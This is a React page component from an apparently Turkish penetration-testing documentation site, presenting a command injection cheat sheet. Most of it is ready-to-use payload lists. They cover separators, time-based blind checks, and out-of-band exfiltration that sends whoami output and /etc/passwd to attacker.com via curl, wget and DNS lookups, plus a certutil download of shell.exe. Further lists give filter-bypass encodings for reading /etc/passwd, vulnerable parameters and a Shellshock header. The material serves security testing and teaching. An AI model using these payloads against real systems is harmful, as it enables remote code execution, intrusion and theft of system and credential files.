"use client"

import { motion } from "framer-motion"
import { Database, ArrowRight, ArrowLeft } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "basic-separators", title: "Basic Command Separators", level: 2 },
  { id: "blind", title: "Blind Command Injection", level: 2 },
  { id: "filter-bypass", title: "Filter Bypass", level: 2 },
  { id: "vulnerable-params", title: "Common Vulnerable Parameters", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function CommandInjectionPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Injection Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">Command Injection</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            İşletim sistemi komutlarının kullanıcı girdisi üzerinden enjekte edilmesi. Doğrudan RCE
            sağlar. ping, nslookup, file operations gibi system call kullanan fonksiyonlar hedef alınır.
          </p>
        </motion.div>

        <Callout type="warning" title="Kritik Seviye">
          Command injection = RCE. Genelde P1/Critical. Sunucuda tam kontrol elde edilebilir.
        </Callout>

        <motion.section variants={fadeIn} id="basic-separators" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Basic Command Separators
          </h2>
          <PayloadList
            title="Linux/Unix"
            initialShow={10}
            payloads={[
              { code: `; ls`, note: "Semicolon - komut ayırıcı" },
              { code: `| ls`, note: "Pipe" },
              { code: `|| ls`, note: "OR - ilk komut başarısız olursa" },
              { code: `&& ls`, note: "AND - ilk komut başarılı olursa" },
              { code: `& ls`, note: "Background execution" },
              { code: "`id`", note: "Backtick command substitution" },
              { code: "$(id)", note: "Dollar command substitution" },
              { code: `; ls #`, note: "Comment ile kalan komutu ignore et" },
              { code: `\\n ls`, note: "Newline" },
              { code: `%0a ls`, note: "URL encoded newline" },
              { code: `%0d%0a ls`, note: "CRLF" },
            ]}
          />

          <PayloadList
            title="Windows"
            initialShow={8}
            payloads={[
              { code: `& dir`, note: "Command separator" },
              { code: `&& dir`, note: "AND operator" },
              { code: `| dir`, note: "Pipe" },
              { code: `|| dir`, note: "OR operator" },
              { code: `\\n dir`, note: "Newline" },
              { code: `%0a dir`, note: "URL encoded newline" },
              { code: `; dir`, note: "Bazı parser'larda çalışır" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="blind" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Blind Command Injection
          </h2>
          <Callout type="info" title="Dipnot">
            Komut çıktısı görünmüyorsa time-based veya out-of-band teknikler kullanın.
          </Callout>
          <PayloadList
            title="Time-Based Detection"
            initialShow={6}
            payloads={[
              { code: `; sleep 10`, note: "10 saniye gecikme" },
              { code: `| sleep 10` },
              { code: `& ping -c 10 127.0.0.1`, note: "Ping delay" },
              { code: `& timeout /t 10`, note: "Windows delay" },
              { code: "$(sleep 10)", note: "Subshell delay" },
              { code: "`sleep 10`", note: "Backtick delay" },
            ]}
          />

          <PayloadList
            title="Out-of-Band (OOB)"
            initialShow={8}
            payloads={[
              { code: `; curl https://attacker.burpcollaborator.net`, note: "HTTP callback" },
              { code: "; wget https://attacker.com/$(whoami)", note: "Data in URL" },
              { code: "; ping -c 1 $(whoami).attacker.com", note: "DNS exfiltration" },
              { code: "; nslookup $(cat /etc/hostname).attacker.com", note: "DNS exfil hostname" },
              { code: "; curl https://attacker.com/?data=$(cat /etc/passwd | base64)", note: "File exfil via HTTP" },
              { code: `| curl -X POST -d @/etc/passwd https://attacker.com/collect`, note: "POST file content" },
              { code: "; dig $(whoami).attacker.com", note: "DNS lookup exfil" },
              { code: `& certutil -urlcache -split -f https://attacker.com/shell.exe shell.exe`, note: "Windows download" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="filter-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Filter Bypass
          </h2>
          <PayloadList
            title="Bypass Teknikleri"
            initialShow={10}
            payloads={[
              { code: `c'a't /etc/passwd`, note: "Quote bypass" },
              { code: `c"a"t /etc/passwd`, note: "Double quote bypass" },
              { code: `c\\at /etc/passwd`, note: "Backslash bypass" },
              { code: `/???/??t /???/p??s??`, note: "Wildcard bypass (cat /etc/passwd)" },
              { code: "cat$IFS/etc/passwd", note: "$IFS = space bypass" },
              { code: "cat${IFS}/etc/passwd", note: "${IFS} variant" },
              { code: `{cat,/etc/passwd}`, note: "Brace expansion" },
              { code: `cat</etc/passwd`, note: "Input redirect" },
              { code: "X=$'cat\\x20/etc/passwd'&&$X", note: "Hex encoded space" },
              { code: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash`, note: "Base64 encoded command" },
              { code: "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')", note: "Hex encoded command" },
              { code: `w]h[o]a[m]i`, note: "Bracket bypass" },
              { code: `\\w\\h\\o\\a\\m\\i`, note: "Backslash every char" },
              { code: `rev<<<'dwssap/cte/ tac' | bash`, note: "Reverse string" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="vulnerable-params" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Common Vulnerable Parameters
          </h2>
          <PayloadList
            title="Hedef Parametreler"
            initialShow={8}
            payloads={[
              { code: `?ip=127.0.0.1;id`, note: "Ping/traceroute tool" },
              { code: `?host=evil.com;id`, note: "DNS lookup tool" },
              { code: `?filename=test;id`, note: "File operations" },
              { code: `?dir=/tmp;id`, note: "Directory listing" },
              { code: `?cmd=status`, note: "Direct command parameter" },
              { code: `?domain=test.com;id`, note: "Domain tools" },
              { code: `?url=http://test.com;id`, note: "URL processing" },
              { code: `?template=report;id`, note: "PDF/report generation" },
              { code: `?backup=db;id`, note: "Backup functionality" },
              { code: `User-Agent: () { :; }; /bin/bash -c "id"`, note: "Shellshock (CVE-2014-6271)" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. Tüm input alanlarını belirleyin (URL params, headers, form fields){"\n"}
          2. Temel command separator&apos;ları deneyin (; | || && &){"\n"}
          3. Blind ise time-based ile doğrulayın (sleep/ping){"\n"}
          4. OOB ile exfiltration yapın (Burp Collaborator, interactsh){"\n"}
          5. Filter varsa bypass teknikleri uygulayın
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/ai/insecure-output"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              Insecure Output
            </Link>
            <Link
              href="/docs/injection/ldap"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              LDAP Injection
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
